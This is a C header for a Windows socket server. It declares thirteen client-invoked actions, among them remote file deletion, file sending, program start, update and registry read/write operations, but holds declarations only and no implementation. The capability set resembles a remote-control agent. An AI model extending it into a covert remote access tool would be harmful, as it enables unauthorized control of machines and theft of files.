#ifndef NN_ACTIONS_H
#define NN_ACTIONS_H

#include <winsock2.h>

#define ACTIONS 13

#include "utils.h"
#include "nn_server.h"

struct action_t {
    char name[10];
    int(*func) (char *[], client_t *);
};
typedef struct action_t action_t;

action_t actions[ACTIONS];

void init_actions();
int do_action(const char *id, char *args[], client_t *cl);

/**** Actions utils ****/
void a_printf(const char *action_name, const char *s);
void send_failed(SOCKET s, const char *action_name, const char *reason);
/***********************/

/**** Actions ****/
int action_ls(char *args[], client_t *cl);
int action_update(char *args[], client_t *cl);
int action_start(char *args[], client_t *cl);
int action_ping(char *args[], client_t *cl);
int action_delf(char *args[], client_t *cl);
int action_sendf(char *args[], client_t *cl);
int action_log(char *args[], client_t *cl);
int action_errlog(char *args[], client_t *cl);
int action_dir(char *args[], client_t *cl);
int action_stat(char *args[], client_t *cl);
int action_rege(char *args[], client_t *cl);
int action_regs(char *args[], client_t *cl);
int action_regv(char *args[], client_t *cl);
/*****************/

#endif // NN_ACTIONS_H
